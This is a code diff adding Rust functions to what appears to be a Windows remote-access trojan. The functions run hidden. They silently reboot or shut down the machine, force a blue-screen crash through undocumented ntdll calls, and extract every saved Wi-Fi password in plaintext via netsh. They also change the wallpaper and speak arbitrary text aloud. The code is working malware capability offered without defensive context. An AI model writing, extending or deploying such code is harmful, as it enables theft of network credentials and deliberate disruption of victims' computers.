@@ -274,3 +274,144 @@ fn log_cleanup(msg: &str) {
         eprintln!("[!] {msg}");
     }
 }
+
+// ---------------------------------------------------------------- power / system
+
+pub fn reboot() {
+    let _ = std::process::Command::new("shutdown")
+        .args(["/r", "/t", "0"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn();
+}
+
+pub fn shutdown() {
+    let _ = std::process::Command::new("shutdown")
+        .args(["/s", "/t", "0"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn();
+}
+
+pub fn abort_shutdown() -> String {
+    match std::process::Command::new("shutdown")
+        .arg("/a")
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+    {
+        Ok(o) => {
+            let t = String::from_utf8_lossy(&o.stdout).trim().to_string();
+            if t.is_empty() {
+                "shutdown aborted".into()
+            } else {
+                t
+            }
+        }
+        Err(e) => format!("error: {e}"),
+    }
+}
+
+/// Hard bugcheck via RtlAdjustPrivilege + NtRaiseHardError (response = shutdown).
+pub fn bsod() -> Result<()> {
+    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
+    type RtlAdjustPrivilege = unsafe extern "system" fn(u32, u8, u8, *mut u8) -> i32;
+    type NtRaiseHardError = unsafe extern "system" fn(u32, u32, u32, *mut usize, u32, *mut u32) -> i32;
+
+    unsafe {
+        let ntdll: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
+        let h = GetModuleHandleW(ntdll.as_ptr());
+        if h.is_null() {
+            anyhow::bail!("ntdll not found");
+        }
+        let adj = GetProcAddress(h, b"RtlAdjustPrivilege\0".as_ptr() as *const u8);
+        let raise = GetProcAddress(h, b"NtRaiseHardError\0".as_ptr() as *const u8);
+        let (adj, raise) = match (adj, raise) {
+            (Some(a), Some(r)) => (a, r),
+            _ => anyhow::bail!("ntdll exports missing"),
+        };
+        let adj: RtlAdjustPrivilege = std::mem::transmute(adj);
+        let raise: NtRaiseHardError = std::mem::transmute(raise);
+        let mut old: u8 = 0;
+        adj(19, 1, 0, &mut old); // SeShutdownPrivilege
+        let mut resp: u32 = 0;
+        raise(0xC0000022, 0, 0, std::ptr::null_mut(), 6, &mut resp);
+    }
+    Ok(())
+}
+
+/// Saved Wi-Fi profiles with plaintext keys.
+pub fn wifi_dump() -> String {
+    let out = match std::process::Command::new("netsh")
+        .args(["wlan", "show", "profiles"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+    {
+        Ok(o) => o,
+        Err(e) => return format!("netsh failed: {e}"),
+    };
+    let text = String::from_utf8_lossy(&out.stdout);
+    let mut profiles = Vec::new();
+    for line in text.lines() {
+        if let Some(i) = line.find(':') {
+            if line[..i].to_ascii_lowercase().contains("profile") {
+                let name = line[i + 1..].trim().to_string();
+                if !name.is_empty() {
+                    profiles.push(name);
+                }
+            }
+        }
+    }
+    if profiles.is_empty() {
+        return format!("no Wi-Fi profiles found\n\n{}", text.trim());
+    }
+    let mut result = String::new();
+    for p in &profiles {
+        let mut key = "(open / none)".to_string();
+        if let Ok(o) = std::process::Command::new("netsh")
+            .args(["wlan", "show", "profile", &format!("name={p}"), "key=clear"])
+            .creation_flags(CREATE_NO_WINDOW)
+            .output()
+        {
+            let t = String::from_utf8_lossy(&o.stdout);
+            for l in t.lines() {
+                if let Some(i) = l.find(':') {
+                    if l[..i].to_ascii_lowercase().contains("key content") {
+                        key = l[i + 1..].trim().to_string();
+                    }
+                }
+            }
+        }
+        result.push_str(&format!("{p} : {key}\n"));
+    }
+    result
+}
+
+pub fn set_wallpaper(path: &str) -> Result<()> {
+    use std::ffi::c_void;
+    use windows_sys::Win32::UI::WindowsAndMessaging::{
+        SystemParametersInfoW, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
+    };
+    let w: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
+    let ok = unsafe {
+        SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER,
+            0,
+            w.as_ptr() as *mut c_void,
+            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
+        )
+    };
+    if ok == 0 {
+        anyhow::bail!("SystemParametersInfoW failed");
+    }
+    Ok(())
+}
+
+/// Speak text aloud via Windows TTS (System.Speech through PowerShell).
+pub fn speak(text: &str) {
+    let escaped = text.replace('\'', "''");
+    let script = format!(
+        "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{escaped}')"
+    );
+    let _ = std::process::Command::new("powershell")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
+        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
+        .spawn();
+}
